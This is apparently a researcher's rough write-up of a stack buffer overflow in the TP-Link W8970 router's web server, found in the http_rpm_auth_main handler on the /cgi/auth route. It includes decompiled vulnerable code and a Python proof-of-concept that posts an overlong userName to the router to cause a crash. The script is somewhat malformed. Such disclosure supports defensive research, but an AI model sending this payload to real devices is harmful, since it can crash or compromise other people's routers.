# Stack base buffer overflow on the TP-Link W8970
> **Researchers:** [Mi0r4](https://github.com/miora-sora)  & [Mehrdoost](https://github.com/Mehrdoost)

One day when I was really bored, I told my friends to send me the models and types of routers and iot devices they have so that I can send them an example of vulnerabilities. In the meantime, they said the name of this device is tp-link

In the first part, I went to /etc to check the entries so that I can get through it the type of input data of the interfaces and things like this. The best parts that are really interesting for us to develop the exploit are ppp and pppoe and also l2tp and so on. http are for this part In this part I went to httpd which is a custom web server to start with

![1](https://raw.githubusercontent.com/ReverseForge/Writeups/writeup-draft/assets/bandicam_2023-08-12_21-26-00-684_t4ia.jpg)

In the above image, I saw io, which is the input and output controller, which is referenced to several functions that you see

![2](https://raw.githubusercontent.com/ReverseForge/Writeups/writeup-draft/assets/bandicam_2023-08-12_21-59-43-150_b7d1.jpg)
 
The function searches for different paths and returns 404 if there is none

![3](https://raw.githubusercontent.com/ReverseForge/Writeups/writeup-draft/assets/bandicam_2023-08-12_22-03-06-112_pmvt.jpg)

the interesting route

The input is parsed from the http header side on the 

![4](https://raw.githubusercontent.com/ReverseForge/Writeups/writeup-draft/assets/bandicam_2023-08-12_22-09-14-031_je76.jpg)

vulnerable function: http_rpm_auth_main

vulnerability :

```          if (param_1[0xd] == 1) {
            pcVar3 = "adminName=%s\nadminPwd=%s\n";
          }
          else {
            pcVar3 = "userName=%s\nuserPwd=%s\n";
          }
          sprintf(acStack_1fbc,pcVar3);
          iVar1 = rdp_setObj(0,"USER_CFG",&local_1fec,acStack_1fbc,2);
```
these one is realte show me get header requests parameters and copy it to stack with sprintf after that
i nee know which route get input to it so i guss maybe these function xref to him route


```
http_alias_addEntryByArg(2,"/cgi/auth",(char *)0x0,(int)http_rpm_auth_main,g_http_author_default);
```
the param_1 is int i dont have any idea what these do so i need analyse these function
param_2 is route 
param_3 is 0x0
param_4 call the function to get parameters of header requests
param_5 may be these is an default parameter set by device

so in these route we can use these parameters of http header to get overflow?

```
import requests
headers = {"Host": "192.168.0.1",
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
          "Accept": "*/*","Accept-Language": "en-US,en;q=0.5",
          "Accept-Encoding": "gzip, deflate","Content-Type": "text/plain",
          "Content-Length": "78","Origin": "http://192.168.0.1",
          "Connection": "close",
          "Referer": "http://192.168.0.1/"}

may be these 
payload = "a" * 2048
formdata = "[/cgi/auth#0,0,0,0,0,0#0,0,0,0,0,0]0,userName={}nuserPwd=1231313".format(payload)
url = "http://192.168.0.1/cgi?8"
response = requests.post(url, data=formdata, headers=headers)```
print response.text
```
if doesn't work change the parameters to true one of them and test it to get crash so we can exploit it like that ..we got duplicate 
